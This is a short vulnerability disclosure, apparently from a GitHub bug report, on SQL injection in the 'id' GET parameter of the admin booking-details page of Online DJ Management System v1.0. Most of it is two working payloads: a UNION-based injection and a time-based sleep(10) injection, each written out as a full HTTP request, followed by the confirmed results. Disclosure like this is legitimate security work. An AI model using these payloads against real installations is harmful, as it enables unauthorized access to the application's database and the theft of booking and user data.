# Online DJ Management System v1.0 has SQL injection

BUG_Author:Andy_LB

Website source code address:https://www.sourcecodester.com/php/15150/online-dj-management-system-phpoop-free-source-code.html

Vulnerability File: /odjms/admin/bookings/view_details.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1) union all select null,concat(0x717273,0x5556575859),null,null,null,null,null,null,null,null,null,null,null,null,null-- -

```
GET /odjms/admin/bookings/view_details.php?id=-1)%20union%20all%20select%20null,concat(0x717273,0x5556575859),null,null,null,null,null,null,null,null,null,null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fqf068shk0hd5fdebbm98ft8ul
Connection: close
```

union query success

![image](https://github.com/ShellHunTerAndyLABA/bug_report/blob/main/sql1.png)

Payload2:id=1) and (select 2 from (select(sleep(10)))x) and (3=3

```
GET /odjms/admin/bookings/view_details.php?id=1)%20and%20(select%202%20from%20(select(sleep(10)))x)%20and%20(3=3 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fqf068shk0hd5fdebbm98ft8ul
Connection: close
```

The server's response time is 10 seconds

![image](https://github.com/ShellHunTerAndyLABA/bug_report/blob/main/sql2.png)
